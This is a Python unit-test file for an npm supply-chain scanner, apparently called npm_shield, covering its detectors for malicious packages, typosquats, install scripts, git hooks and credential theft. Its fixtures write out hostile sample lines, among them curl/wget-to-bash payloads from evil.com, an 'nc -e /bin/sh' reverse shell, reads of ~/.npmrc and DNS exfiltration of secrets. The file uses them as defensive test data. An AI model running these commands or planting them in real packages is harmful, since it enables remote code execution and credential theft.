"""Unit tests for npm_shield/detectors.py.

Tests cover each individual detector function using mock package metadata
and temporary filesystem fixtures. No real node_modules or npm registry
calls are made.

Test classes:
- TestLevenshtein: edit-distance helper.
- TestDetectKnownMalicious: known-bad package detection.
- TestDetectTyposquatting: typosquat heuristic.
- TestDetectSuspiciousScripts: lifecycle script scanning.
- TestDetectGitHookInjection: .git/hooks analysis.
- TestDetectCredentialHarvesting: source file pattern scanning.
- TestDetectMcpServers: MCP server registration detection.
- TestDetectRogueBinaries: rogue binary detection.
- TestDetectDependencyConfusion: dependency confusion heuristics.
- TestRunAllDetectors: smoke test for the convenience aggregator.
"""

from __future__ import annotations

import json
import os
import stat
from pathlib import Path
from typing import Any

import pytest

from npm_shield.detectors import (
    Finding,
    _levenshtein,
    detect_credential_harvesting,
    detect_dependency_confusion,
    detect_git_hook_injection,
    detect_known_malicious,
    detect_mcp_servers,
    detect_rogue_binaries,
    detect_suspicious_scripts,
    detect_typosquatting,
    run_all_detectors,
)


# ---------------------------------------------------------------------------
# Fixtures and helpers
# ---------------------------------------------------------------------------


def _pkg(
    name: str,
    version: str = "1.0.0",
    scripts: dict[str, str] | None = None,
    extra_json: dict[str, Any] | None = None,
    path: Path | None = None,
) -> dict[str, Any]:
    """Build a minimal package metadata dictionary for tests."""
    pkg_json: dict[str, Any] = {"name": name, "version": version}
    if scripts:
        pkg_json["scripts"] = scripts
    if extra_json:
        pkg_json.update(extra_json)
    return {
        "name": name,
        "version": version,
        "path": path or Path("/fake/node_modules") / name,
        "package_json": pkg_json,
    }


def _make_node_modules(tmp_path: Path) -> Path:
    """Create a node_modules directory structure."""
    nm = tmp_path / "node_modules"
    nm.mkdir()
    return nm


def _make_package_dir(
    node_modules: Path,
    name: str,
    version: str = "1.0.0",
    extra_json: dict[str, Any] | None = None,
) -> Path:
    """Create a package directory inside node_modules with a package.json."""
    if name.startswith("@"):
        scope, pkg_name = name.lstrip("@").split("/", 1)
        pkg_dir = node_modules / f"@{scope}" / pkg_name
    else:
        pkg_dir = node_modules / name
    pkg_dir.mkdir(parents=True, exist_ok=True)
    data: dict[str, Any] = {"name": name, "version": version}
    if extra_json:
        data.update(extra_json)
    (pkg_dir / "package.json").write_text(json.dumps(data), encoding="utf-8")
    return pkg_dir


def _assert_finding(
    findings: list[Finding],
    *,
    detector: str | None = None,
    package: str | None = None,
    severity: str | None = None,
    description_contains: str | None = None,
) -> Finding:
    """Assert that at least one finding matches the given criteria and return it."""
    for f in findings:
        if detector and f.get("detector") != detector:
            continue
        if package and package not in f.get("package", ""):
            continue
        if severity and f.get("severity") != severity:
            continue
        if description_contains and description_contains not in f.get("description", ""):
            continue
        return f
    raise AssertionError(
        f"No matching finding found. criteria=({detector!r}, {package!r}, "
        f"{severity!r}, {description_contains!r})\n"
        f"Findings: {findings}"
    )


# ---------------------------------------------------------------------------
# TestLevenshtein
# ---------------------------------------------------------------------------


class TestLevenshtein:
    """Tests for the _levenshtein edit distance helper."""

    def test_identical_strings(self) -> None:
        assert _levenshtein("abc", "abc") == 0

    def test_empty_strings(self) -> None:
        assert _levenshtein("", "") == 0

    def test_one_empty(self) -> None:
        assert _levenshtein("abc", "") == 3
        assert _levenshtein("", "abc") == 3

    def test_single_insertion(self) -> None:
        assert _levenshtein("cat", "cats") == 1

    def test_single_deletion(self) -> None:
        assert _levenshtein("lodash", "lod4sh") == 1
        assert _levenshtein("express", "expres") == 1

    def test_single_substitution(self) -> None:
        assert _levenshtein("react", "reack") == 1

    def test_multiple_edits(self) -> None:
        assert _levenshtein("lodash", "lo0a5h") == 2

    def test_completely_different(self) -> None:
        dist = _levenshtein("abc", "xyz")
        assert dist == 3

    def test_symmetry(self) -> None:
        assert _levenshtein("lodash", "lod4sh") == _levenshtein("lod4sh", "lodash")

    def test_known_typosquat_pairs(self) -> None:
        # Known real typosquat pairs from npm registry incidents
        assert _levenshtein("lodash", "lod4sh") == 1
        assert _levenshtein("express", "expres") == 1
        assert _levenshtein("cross-env", "crossenv") == 1


# ---------------------------------------------------------------------------
# TestDetectKnownMalicious
# ---------------------------------------------------------------------------


class TestDetectKnownMalicious:
    """Tests for detect_known_malicious."""

    def test_flags_known_bad_package_all_versions(self) -> None:
        packages = [_pkg("crossenv", "1.0.0")]
        findings = detect_known_malicious(packages)
        assert len(findings) >= 1
        f = _assert_finding(findings, detector="known-malicious", package="crossenv")
        assert f["severity"] == "critical"

    def test_flags_known_bad_specific_version(self) -> None:
        packages = [_pkg("event-stream", "3.3.6")]
        findings = detect_known_malicious(packages)
        assert len(findings) >= 1
        _assert_finding(
            findings,
            detector="known-malicious",
            package="event-stream",
            severity="critical",
        )

    def test_does_not_flag_safe_version(self) -> None:
        """event-stream at a non-malicious version should not be flagged."""
        packages = [_pkg("event-stream", "3.3.4")]
        findings = detect_known_malicious(packages)
        # event-stream only flags version 3.3.6
        event_stream_findings = [
            f for f in findings if "event-stream" in f.get("package", "")
        ]
        assert len(event_stream_findings) == 0

    def test_does_not_flag_safe_package(self) -> None:
        packages = [_pkg("lodash", "4.17.21"), _pkg("express", "4.18.2")]
        findings = detect_known_malicious(packages)
        assert findings == []

    def test_empty_input(self) -> None:
        assert detect_known_malicious([]) == []

    def test_finding_has_required_fields(self) -> None:
        packages = [_pkg("crossenv", "1.0.0")]
        findings = detect_known_malicious(packages)
        assert len(findings) >= 1
        f = findings[0]
        assert "package" in f
        assert "detector" in f
        assert "severity" in f
        assert "description" in f
        assert "remediation" in f
        assert "metadata" in f

    def test_metadata_contains_reference(self) -> None:
        packages = [_pkg("crossenv", "1.0.0")]
        findings = detect_known_malicious(packages)
        f = _assert_finding(findings, detector="known-malicious")
        assert "reference" in f["metadata"]

    def test_multiple_known_bad_packages(self) -> None:
        packages = [
            _pkg("crossenv", "1.0.0"),
            _pkg("event-stream", "3.3.6"),
            _pkg("ua-parser-js", "0.7.29"),
        ]
        findings = detect_known_malicious(packages)
        assert len(findings) == 3

    def test_ua_parser_js_bad_version_flagged(self) -> None:
        packages = [_pkg("ua-parser-js", "0.7.29")]
        findings = detect_known_malicious(packages)
        _assert_finding(findings, package="ua-parser-js", severity="critical")

    def test_ua_parser_js_safe_version_not_flagged(self) -> None:
        packages = [_pkg("ua-parser-js", "0.7.28")]
        findings = detect_known_malicious(packages)
        assert len(findings) == 0

    def test_twilio_npm_flagged(self) -> None:
        packages = [_pkg("twilio-npm", "1.0.0")]
        findings = detect_known_malicious(packages)
        _assert_finding(findings, package="twilio-npm", severity="critical")


# ---------------------------------------------------------------------------
# TestDetectTyposquatting
# ---------------------------------------------------------------------------


class TestDetectTyposquatting:
    """Tests for detect_typosquatting."""

    def test_flags_obvious_typosquat(self) -> None:
        packages = [_pkg("lod4sh", "4.17.20")]
        findings = detect_typosquatting(packages)
        _assert_finding(
            findings,
            detector="typosquatting",
            package="lod4sh",
            severity="high",
        )

    def test_flags_expres_as_typosquat_of_express(self) -> None:
        packages = [_pkg("expres", "4.18.1")]
        findings = detect_typosquatting(packages)
        _assert_finding(
            findings,
            detector="typosquatting",
            description_contains="express",
        )

    def test_does_not_flag_legitimate_package(self) -> None:
        packages = [_pkg("lodash", "4.17.21"), _pkg("express", "4.18.2")]
        findings = detect_typosquatting(packages)
        assert findings == []

    def test_does_not_flag_completely_different_package(self) -> None:
        packages = [_pkg("completely-unrelated-xyz-package", "1.0.0")]
        findings = detect_typosquatting(packages)
        assert findings == []

    def test_skip_known_malicious_by_default(self) -> None:
        """crossenv is both a typosquat and known-malicious — should skip typosquat."""
        packages = [_pkg("crossenv", "1.0.0")]
        findings = detect_typosquatting(packages, skip_known_malicious=True)
        typo_findings = [f for f in findings if f["detector"] == "typosquatting"]
        assert len(typo_findings) == 0

    def test_include_known_malicious_when_flag_off(self) -> None:
        """crossenv is edit-distance 1 from cross-env; should flag if not skipping."""
        packages = [_pkg("crossenv", "1.0.0")]
        findings = detect_typosquatting(packages, skip_known_malicious=False)
        typo_findings = [f for f in findings if f["detector"] == "typosquatting"]
        assert len(typo_findings) >= 1

    def test_metadata_contains_likely_target(self) -> None:
        packages = [_pkg("lod4sh", "4.17.20")]
        findings = detect_typosquatting(packages)
        f = _assert_finding(findings, detector="typosquatting")
        assert f["metadata"]["likely_target"] == "lodash"
        assert f["metadata"]["edit_distance"] == 1

    def test_empty_input(self) -> None:
        assert detect_typosquatting([]) == []

    def test_short_package_name_no_false_positive(self) -> None:
        """Short package names like 'qs', 'ws', 'nx' should not match each other."""
        packages = [_pkg("ax", "1.0.0")]
        # 'ax' is edit-distance 1 from 'nx' (max_edit_distance=1 for nx)
        # but 'ax' is also edit-distance 1 from 'ws', 'qs', 'pm2'...
        # We just check it doesn't crash
        findings = detect_typosquatting(packages)
        assert isinstance(findings, list)

    def test_returns_high_severity(self) -> None:
        packages = [_pkg("lod4sh", "4.17.20")]
        findings = detect_typosquatting(packages)
        f = findings[0]
        assert f["severity"] == "high"


# ---------------------------------------------------------------------------
# TestDetectSuspiciousScripts
# ---------------------------------------------------------------------------


class TestDetectSuspiciousScripts:
    """Tests for detect_suspicious_scripts."""

    def test_flags_curl_pipe_shell_in_postinstall(self) -> None:
        packages = [
            _pkg(
                "evil-pkg",
                scripts={"postinstall": "curl http://evil.com/payload.sh | bash"},
            )
        ]
        findings = detect_suspicious_scripts(packages)
        _assert_finding(
            findings,
            detector="suspicious-script",
            package="evil-pkg",
            severity="critical",
        )

    def test_flags_wget_pipe_shell(self) -> None:
        packages = [
            _pkg(
                "bad-pkg",
                scripts={"preinstall": "wget http://evil.com | sh"},
            )
        ]
        findings = detect_suspicious_scripts(packages)
        _assert_finding(findings, detector="suspicious-script")

    def test_flags_base64_decode_pipe_shell(self) -> None:
        packages = [
            _pkg(
                "obfuscated-pkg",
                scripts={"install": "echo 'YmFzaA==' | base64 -d | bash"},
            )
        ]
        findings = detect_suspicious_scripts(packages)
        _assert_finding(findings, detector="suspicious-script", severity="critical")

    def test_flags_git_hook_injection_via_script(self) -> None:
        packages = [
            _pkg(
                "hook-injector",
                scripts={"postinstall": "cp payload.sh .git/hooks/pre-commit"},
            )
        ]
        findings = detect_suspicious_scripts(packages)
        _assert_finding(findings, detector="suspicious-script")

    def test_does_not_flag_benign_scripts(self) -> None:
        packages = [
            _pkg(
                "safe-pkg",
                scripts={"postinstall": "node setup.js"},
            ),
            _pkg(
                "another-safe",
                scripts={"prepare": "npm run build"},
            ),
        ]
        findings = detect_suspicious_scripts(packages)
        assert findings == []

    def test_does_not_flag_packages_without_lifecycle_scripts(self) -> None:
        packages = [
            _pkg(
                "no-scripts-pkg",
                scripts={"start": "node index.js", "test": "jest"},
            )
        ]
        findings = detect_suspicious_scripts(packages)
        assert findings == []

    def test_empty_input(self) -> None:
        assert detect_suspicious_scripts([]) == []

    def test_metadata_contains_script_details(self) -> None:
        packages = [
            _pkg(
                "evil-pkg",
                scripts={"postinstall": "curl http://evil.com | bash"},
            )
        ]
        findings = detect_suspicious_scripts(packages)
        f = _assert_finding(findings, detector="suspicious-script")
        assert f["metadata"]["script_name"] == "postinstall"
        assert "curl" in f["metadata"]["script_value"]
        assert "matched_pattern" in f["metadata"]

    def test_node_inline_eval_flagged(self) -> None:
        packages = [
            _pkg(
                "tricky-pkg",
                scripts={
                    "postinstall": "node -e \"require('http').get('http://evil.com')\""
                },
            )
        ]
        findings = detect_suspicious_scripts(packages)
        _assert_finding(findings, detector="suspicious-script")

    def test_remote_download_in_script_flagged(self) -> None:
        packages = [
            _pkg(
                "downloader-pkg",
                scripts={"postinstall": "curl https://evil.com/binary -o /tmp/bin"},
            )
        ]
        findings = detect_suspicious_scripts(packages)
        _assert_finding(findings, detector="suspicious-script")


# ---------------------------------------------------------------------------
# TestDetectGitHookInjection
# ---------------------------------------------------------------------------


class TestDetectGitHookInjection:
    """Tests for detect_git_hook_injection."""

    def _setup_git_hooks(self, project: Path) -> Path:
        """Create .git/hooks directory."""
        hooks_dir = project / ".git" / "hooks"
        hooks_dir.mkdir(parents=True, exist_ok=True)
        return hooks_dir

    def test_flags_malicious_hook_content(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        hooks_dir = self._setup_git_hooks(project)
        hook = hooks_dir / "pre-commit"
        hook.write_text(
            "#!/bin/sh\ncurl http://evil.com/backdoor.sh | bash\n",
            encoding="utf-8",
        )

        findings = detect_git_hook_injection(project)
        _assert_finding(
            findings,
            detector="git-hook",
            description_contains="pre-commit",
        )

    def test_flags_non_standard_hook(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        hooks_dir = self._setup_git_hooks(project)
        hook = hooks_dir / "non-standard-hook"
        hook.write_text("#!/bin/sh\necho injected\n", encoding="utf-8")
        # Make it executable
        hook.chmod(hook.stat().st_mode | stat.S_IXUSR)

        findings = detect_git_hook_injection(project)
        _assert_finding(
            findings,
            detector="git-hook",
            description_contains="non-standard-hook",
        )

    def test_ignores_sample_files(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        hooks_dir = self._setup_git_hooks(project)
        sample = hooks_dir / "pre-commit.sample"
        sample.write_text("#!/bin/sh\ncurl http://evil.com | bash\n", encoding="utf-8")

        findings = detect_git_hook_injection(project)
        assert findings == []

    def test_returns_empty_when_no_git_dir(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        findings = detect_git_hook_injection(project)
        assert findings == []

    def test_flags_netcat_in_hook(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        hooks_dir = self._setup_git_hooks(project)
        hook = hooks_dir / "post-merge"
        hook.write_text(
            "#!/bin/sh\nnc -e /bin/sh 192.168.1.1 4444\n",
            encoding="utf-8",
        )

        findings = detect_git_hook_injection(project)
        _assert_finding(
            findings,
            detector="git-hook",
            severity="critical",
        )

    def test_finding_metadata_has_hook_name(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        hooks_dir = self._setup_git_hooks(project)
        hook = hooks_dir / "post-checkout"
        hook.write_text(
            "#!/bin/sh\ncurl http://evil.com | bash\n",
            encoding="utf-8",
        )

        findings = detect_git_hook_injection(project)
        f = _assert_finding(findings, detector="git-hook")
        assert "hook_name" in f["metadata"]

    def test_correlates_with_postinstall_packages(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        hooks_dir = self._setup_git_hooks(project)
        hook = hooks_dir / "pre-push"
        hook.write_text("#!/bin/sh\ncurl http://evil.com | bash\n", encoding="utf-8")

        packages = [
            _pkg(
                "hook-injector",
                scripts={"postinstall": "cp hook.sh .git/hooks/pre-push"},
            )
        ]
        findings = detect_git_hook_injection(project, packages)
        f = _assert_finding(findings, detector="git-hook")
        # Should mention the postinstall package in description or metadata
        assert (
            "hook-injector" in f["description"]
            or "hook-injector" in str(f["metadata"])
        )


# ---------------------------------------------------------------------------
# TestDetectCredentialHarvesting
# ---------------------------------------------------------------------------


class TestDetectCredentialHarvesting:
    """Tests for detect_credential_harvesting."""

    def _make_pkg_with_source(
        self,
        tmp_path: Path,
        name: str,
        source_content: str,
        filename: str = "index.js",
    ) -> dict[str, Any]:
        """Create a package directory with a source file and return metadata."""
        pkg_dir = tmp_path / "node_modules" / name
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(
            json.dumps({"name": name, "version": "1.0.0"}), encoding="utf-8"
        )
        (pkg_dir / filename).write_text(source_content, encoding="utf-8")
        return {
            "name": name,
            "version": "1.0.0",
            "path": pkg_dir,
            "package_json": {"name": name, "version": "1.0.0"},
        }

    def test_flags_eval_obfuscated_payload(self, tmp_path: Path) -> None:
        code = "eval(Buffer.from('aGVsbG8=', 'base64').toString())"
        pkg = self._make_pkg_with_source(tmp_path, "evil-pkg", code)
        findings = detect_credential_harvesting([pkg])
        _assert_finding(
            findings,
            detector="credential-harvesting",
            package="evil-pkg",
        )

    def test_flags_credential_file_read(self, tmp_path: Path) -> None:
        code = "fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8')"
        pkg = self._make_pkg_with_source(tmp_path, "credential-thief", code)
        findings = detect_credential_harvesting([pkg])
        _assert_finding(
            findings,
            detector="credential-harvesting",
            package="credential-thief",
        )

    def test_flags_reverse_shell(self, tmp_path: Path) -> None:
        code = (
            "require('child_process').exec("
            "'bash -c \"curl http://evil.com | bash\"')"
        )
        pkg = self._make_pkg_with_source(tmp_path, "backdoor-pkg", code)
        findings = detect_credential_harvesting([pkg])
        _assert_finding(
            findings,
            detector="credential-harvesting",
            severity="critical",
        )

    def test_does_not_flag_benign_code(self, tmp_path: Path) -> None:
        code = "const x = require('lodash');\nmodule.exports = x;\n"
        pkg = self._make_pkg_with_source(tmp_path, "safe-pkg", code)
        findings = detect_credential_harvesting([pkg])
        assert findings == []

    def test_empty_input(self) -> None:
        assert detect_credential_harvesting([]) == []

    def test_finding_metadata_contains_source_file(self, tmp_path: Path) -> None:
        code = "eval(atob('YWxlcnQoMSk='))"
        pkg = self._make_pkg_with_source(tmp_path, "evil-pkg", code)
        findings = detect_credential_harvesting([pkg])
        if findings:
            f = findings[0]
            assert "source_file" in f["metadata"]
            assert "matched_pattern" in f["metadata"]

    def test_respects_max_findings_per_package(self, tmp_path: Path) -> None:
        # Create a file with multiple distinct malicious patterns
        code = "\n".join(
            [
                "eval(Buffer.from('x', 'base64').toString())",
                "eval(atob('x'))",
                "dns.resolve(process.env.SECRET + '.evil.com')",
                "fs.readFileSync(path.join(os.homedir(), '.npmrc'))",
                "require('child_process').exec('curl http://x | bash')",
                "new Function('process', 'return process.env')",
            ]
        )
        pkg = self._make_pkg_with_source(tmp_path, "evil-pkg", code)
        findings = detect_credential_harvesting([pkg], max_findings_per_package=2)
        pkg_findings = [f for f in findings if f["package"] == "evil-pkg"]
        assert len(pkg_findings) <= 2

    def test_skips_package_without_source_files(self) -> None:
        # Package with no actual path on disk
        pkg = _pkg("ghost-pkg")
        findings = detect_credential_harvesting([pkg])
        assert findings == []


# ---------------------------------------------------------------------------
# TestDetectMcpServers
# ---------------------------------------------------------------------------


class TestDetectMcpServers:
    """Tests for detect_mcp_servers."""

    def test_flags_package_with_mcp_server_in_name(self) -> None:
        packages = [_pkg("my-mcp-server", "1.0.0")]
        findings = detect_mcp_servers(packages)
        _assert_finding(
            findings,
            detector="mcp-server",
            package="my-mcp-server",
        )

    def test_flags_package_with_mcp_json_field(self) -> None:
        pkg = _pkg("suspicious-pkg", "1.0.0")
        pkg["package_json"]["mcp"] = {"transport": "stdio"}
        findings = detect_mcp_servers([pkg])
        _assert_finding(findings, detector="mcp-server")

    def test_flags_package_with_mcp_sdk_dependency(self) -> None:
        pkg = _pkg("my-ai-tool", "1.0.0")
        pkg["package_json"]["dependencies"] = {
            "@modelcontextprotocol/sdk": "^1.0.0"
        }
        findings = detect_mcp_servers([pkg])
        _assert_finding(findings, detector="mcp-server")

    def test_known_legitimate_mcp_package_is_info_severity(self) -> None:
        packages = [
            _pkg("@modelcontextprotocol/server-filesystem", "1.0.0")
        ]
        findings = detect_mcp_servers(packages)
        if findings:
            f = _assert_finding(findings, detector="mcp-server")
            assert f["severity"] == "info"

    def test_does_not_flag_unrelated_package(self) -> None:
        packages = [_pkg("lodash", "4.17.21"), _pkg("express", "4.18.2")]
        findings = detect_mcp_servers(packages)
        assert findings == []

    def test_empty_input(self) -> None:
        assert detect_mcp_servers([]) == []

    def test_metadata_contains_indicators(self) -> None:
        packages = [_pkg("rogue-mcp-server", "1.0.0")]
        findings = detect_mcp_servers(packages)
        f = _assert_finding(findings, detector="mcp-server")
        assert "matched_indicators" in f["metadata"]
        assert len(f["metadata"]["matched_indicators"]) > 0

    def test_flags_mcpserver_keyword_in_name(self) -> None:
        packages = [_pkg("custom-mcpserver", "1.0.0")]
        findings = detect_mcp_servers(packages)
        _assert_finding(findings, detector="mcp-server")

    def test_unknown_mcp_server_is_medium_severity(self) -> None:
        packages = [_pkg("unknown-mcp-server", "1.0.0")]
        findings = detect_mcp_servers(packages)
        f = _assert_finding(findings, detector="mcp-server")
        assert f["severity"] == "medium"


# ---------------------------------------------------------------------------
# TestDetectRogueBinaries
# ---------------------------------------------------------------------------


class TestDetectRogueBinaries:
    """Tests for detect_rogue_binaries."""

    def _make_bin_entry(
        self,
        tmp_path: Path,
        bin_name: str,
        owning_pkg: str | None,
        as_symlink: bool = False,
        make_executable: bool = True,
    ) -> Path:
        """Create a .bin entry."""
        nm = tmp_path / "node_modules"
        nm.mkdir(exist_ok=True)
        bin_dir = nm / ".bin"
        bin_dir.mkdir(exist_ok=True)

        if as_symlink and owning_pkg:
            # Create the actual file
            pkg_dir = nm / owning_pkg / "bin"
            pkg_dir.mkdir(parents=True, exist_ok=True)
            target = pkg_dir / f"{bin_name}.js"
            target.write_text("#!/usr/bin/env node", encoding="utf-8")
            link = bin_dir / bin_name
            try:
                link.symlink_to(target)
            except OSError:
                link.write_text("#!/bin/sh", encoding="utf-8")
        else:
            link = bin_dir / bin_name
            link.write_text("#!/bin/sh\necho malicious", encoding="utf-8")

        if make_executable:
            try:
                link.chmod(link.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP)
            except OSError:
                pass

        return nm

    def test_flags_unattributed_binary(self, tmp_path: Path) -> None:
        nm = self._make_bin_entry(tmp_path, "mystery-cli", None)
        # No installed packages
        findings = detect_rogue_binaries(nm, [])
        _assert_finding(
            findings,
            detector="rogue-binary",
            description_contains="mystery-cli",
        )

    def test_does_not_flag_attributed_binary(self, tmp_path: Path) -> None:
        nm = self._make_bin_entry(
            tmp_path, "safe-cli", "safe-package", as_symlink=True
        )
        packages = [_pkg("safe-package")]
        # Ensure package dir has package.json
        pkg_dir = nm / "safe-package"
        pkg_dir.mkdir(exist_ok=True)
        (pkg_dir / "package.json").write_text(
            '{"name": "safe-package", "version": "1.0.0"}',
            encoding="utf-8",
        )
        findings = detect_rogue_binaries(nm, packages)
        rogue = [f for f in findings if "safe-cli" in f.get("package", "")]
        assert len(rogue) == 0

    def test_flags_mcp_named_binary(self, tmp_path: Path) -> None:
        nm = self._make_bin_entry(
            tmp_path, "mcp-server-cli", "some-package", as_symlink=True
        )
        packages = [_pkg("some-package")]
        # Create package dir
        pkg_dir = nm / "some-package"
        pkg_dir.mkdir(exist_ok=True)
        (pkg_dir / "package.json").write_text(
            '{"name": "some-package", "version": "1.0.0"}',
            encoding="utf-8",
        )
        findings = detect_rogue_binaries(nm, packages)
        mcp_findings = [
            f for f in findings
            if f.get("detector") == "rogue-binary"
            and "mcp-server-cli" in f.get("package", "")
        ]
        assert len(mcp_findings) >= 1

    def test_returns_empty_when_no_bin_dir(self, tmp_path: Path) -> None:
        nm = tmp_path / "node_modules"
        nm.mkdir()
        findings = detect_rogue_binaries(nm, [])
        assert findings == []

    def test_returns_empty_when_node_modules_missing(self, tmp_path: Path) -> None:
        nm = tmp_path / "node_modules"
        findings = detect_rogue_binaries(nm, [])
        assert findings == []

    def test_non_executable_binaries_ignored(self, tmp_path: Path) -> None:
        nm = tmp_path / "node_modules"
        nm.mkdir()
        bin_dir = nm / ".bin"
        bin_dir.mkdir()
        script = bin_dir / "tool"
        script.write_text("echo hello", encoding="utf-8")
        # Do NOT make executable
        findings = detect_rogue_binaries(nm, [])
        assert findings == []

    def test_metadata_has_required_fields(self, tmp_path: Path) -> None:
        nm = self._make_bin_entry(tmp_path, "mystery-cli", None)
        findings = detect_rogue_binaries(nm, [])
        if findings:
            f = findings[0]
            assert "bin_name" in f["metadata"]
            assert "bin_path" in f["metadata"]
            assert "owning_package" in f["metadata"]


# ---------------------------------------------------------------------------
# TestDetectDependencyConfusion
# ---------------------------------------------------------------------------


class TestDetectDependencyConfusion:
    """Tests for detect_dependency_confusion."""

    def test_flags_internal_prefix(self) -> None:
        packages = [_pkg("internal-utils", "1.0.0")]
        findings = detect_dependency_confusion(packages)
        _assert_finding(
            findings,
            detector="dep-confusion",
            package="internal-utils",
        )

    def test_flags_private_prefix(self) -> None:
        packages = [_pkg("private-api-client", "1.0.0")]
        findings = detect_dependency_confusion(packages)
        _assert_finding(findings, detector="dep-confusion")

    def test_flags_corp_prefix(self) -> None:
        packages = [_pkg("corp-login-lib", "1.0.0")]
        findings = detect_dependency_confusion(packages)
        _assert_finding(findings, detector="dep-confusion")

    def test_flags_high_version_number(self) -> None:
        packages = [_pkg("my-library", "9999.0.0")]
        findings = detect_dependency_confusion(packages)
        _assert_finding(
            findings,
            detector="dep-confusion",
            description_contains="9999",
        )

    def test_flags_declared_high_version(self) -> None:
        packages = [_pkg("internal-service", "1.0.0")]
        declared = {"internal-service": "9999.0.0"}
        findings = detect_dependency_confusion(
            packages, declared_dependencies=declared
        )
        _assert_finding(findings, detector="dep-confusion")

    def test_does_not_flag_normal_package(self) -> None:
        packages = [_pkg("lodash", "4.17.21"), _pkg("express", "4.18.2")]
        findings = detect_dependency_confusion(packages)
        assert findings == []

    def test_empty_input(self) -> None:
        assert detect_dependency_confusion([]) == []

    def test_metadata_contains_matched_reasons(self) -> None:
        packages = [_pkg("internal-utils", "1.0.0")]
        findings = detect_dependency_confusion(packages)
        f = _assert_finding(findings, detector="dep-confusion")
        assert "matched_reasons" in f["metadata"]
        assert len(f["metadata"]["matched_reasons"]) > 0

    def test_flags_local_prefix(self) -> None:
        packages = [_pkg("local-auth-module", "2.0.0")]
        findings = detect_dependency_confusion(packages)
        _assert_finding(findings, detector="dep-confusion")

    def test_severity_is_high(self) -> None:
        packages = [_pkg("internal-utils", "1.0.0")]
        findings = detect_dependency_confusion(packages)
        f = _assert_finding(findings, detector="dep-confusion")
        assert f["severity"] == "high"


# ---------------------------------------------------------------------------
# TestRunAllDetectors
# ---------------------------------------------------------------------------


class TestRunAllDetectors:
    """Smoke tests for the run_all_detectors convenience aggregator."""

    def test_returns_list(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        nm = tmp_path / "node_modules"
        nm.mkdir()
        packages = [_pkg("lodash", "4.17.21")]
        result = run_all_detectors(
            project, packages, nm, enable_credential_scan=False
        )
        assert isinstance(result, list)

    def test_detects_known_malicious_in_run_all(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        nm = tmp_path / "node_modules"
        nm.mkdir()
        packages = [_pkg("crossenv", "1.0.0")]
        result = run_all_detectors(
            project, packages, nm, enable_credential_scan=False
        )
        malicious = [f for f in result if f["detector"] == "known-malicious"]
        assert len(malicious) >= 1

    def test_detects_typosquat_in_run_all(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        nm = tmp_path / "node_modules"
        nm.mkdir()
        packages = [_pkg("lod4sh", "4.17.20")]
        result = run_all_detectors(
            project, packages, nm, enable_credential_scan=False
        )
        typo = [f for f in result if f["detector"] == "typosquatting"]
        assert len(typo) >= 1

    def test_empty_packages_returns_empty(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        nm = tmp_path / "node_modules"
        nm.mkdir()
        result = run_all_detectors(
            project, [], nm, enable_credential_scan=False
        )
        assert isinstance(result, list)
        assert len(result) == 0

    def test_all_findings_have_required_keys(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            '{"name": "test", "version": "1.0.0"}', encoding="utf-8"
        )
        nm = tmp_path / "node_modules"
        nm.mkdir()
        packages = [
            _pkg("crossenv", "1.0.0"),
            _pkg("lod4sh", "4.17.20"),
            _pkg(
                "evil-pkg",
                scripts={"postinstall": "curl http://evil.com | bash"},
            ),
        ]
        result = run_all_detectors(
            project, packages, nm, enable_credential_scan=False
        )
        required_keys = {"package", "detector", "severity", "description", "remediation", "metadata"}
        for finding in result:
            assert required_keys.issubset(finding.keys()), (
                f"Finding missing keys: {required_keys - finding.keys()}\n{finding}"
            )
